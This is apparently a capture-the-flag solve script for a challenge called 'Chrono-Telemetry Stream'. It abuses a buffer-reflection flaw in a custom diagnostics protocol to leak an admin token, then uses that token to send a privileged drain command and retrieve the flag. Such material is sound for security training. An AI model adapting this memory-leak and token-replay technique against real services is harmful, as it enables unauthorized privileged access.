#!/usr/bin/env python3
"""
Automated solve script for Challenge 10: Chrono-Telemetry Stream
Exploits zero-copy buffer reflection in DiagnosticsQuery to leak the active 16-byte
administrative token, transmits authenticated CHRONO_DRAIN_CORE command, and captures flag.
"""
import sys
import socket
import struct
import zlib

MAGIC = b"CHRN"
VERSION = 0x0301

TYPE_DIAGNOSTICS = 0x0002
TYPE_ADMIN_CMD   = 0x00A0
TYPE_RESPONSE    = 0x00FF

CMD_DRAIN_CORE   = 0x1337

def pack_packet(type_id, payload):
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    header = struct.pack(">4sHHII", MAGIC, VERSION, type_id, len(payload), crc)
    return header + payload

def recv_packet(s):
    header = s.recv(16)
    if len(header) < 16:
        return None, None
    magic, ver, type_id, plen, crc = struct.unpack(">4sHHII", header)
    payload = b""
    while len(payload) < plen:
        chunk = s.recv(plen - len(payload))
        if not chunk:
            break
        payload += chunk
    return type_id, payload

def solve(host="127.0.0.1", port=8043):
    print(f"[*] Connecting to Chrono-Telemetry Daemon at {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))

    # Step 1: Leak Admin Auth Token via buffer reflection at offset 16
    # Reflection mask = 0x80000000 | 16
    reflection_flag = 0x80000000 | 16
    diag_payload = struct.pack(">II", 0x1337, reflection_flag)
    
    print("[*] Transmitting memory reflection probe to leak admin session capsule...")
    s.sendall(pack_packet(TYPE_DIAGNOSTICS, diag_payload))

    t, resp_payload = recv_packet(s)
    if not resp_payload or len(resp_payload) < 24:
        print("[-] Failed to leak admin token from diagnostics reflection.")
        s.close()
        return None

    # Payload format: [query_id: 4 bytes] [status: 4 bytes] [leaked_bytes: 16 bytes]
    admin_token = resp_payload[8:24]
    print(f"[+] Leaked Active Admin Token (16 bytes): {admin_token}")

    # Step 2: Issue authenticated AdminCommand CHRONO_DRAIN_CORE (0x1337)
    print("[*] Submitting authenticated core drain command (0x1337)...")
    cmd_payload = admin_token + struct.pack(">II", CMD_DRAIN_CORE, 0)
    s.sendall(pack_packet(TYPE_ADMIN_CMD, cmd_payload))

    t, final_resp = recv_packet(s)
    resp_text = final_resp.decode("utf-8", errors="ignore")
    print(f"[+] Server Output:\n{resp_text}")

    s.close()

    for line in resp_text.splitlines():
        if "YUVA{" in line:
            flag = line[line.find("YUVA{"):].split()[0]
            print(f"[+] Successfully solved Challenge 10! Flag: {flag}")
            return flag
        if "FLAG{" in line:
            flag = line[line.find("FLAG{"):].split()[0]
            print(f"[+] Successfully solved Challenge 10! Flag: {flag}")
            return flag

    print("[-] Flag not retrieved.")
    return None

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 8043
    solve(h, p)
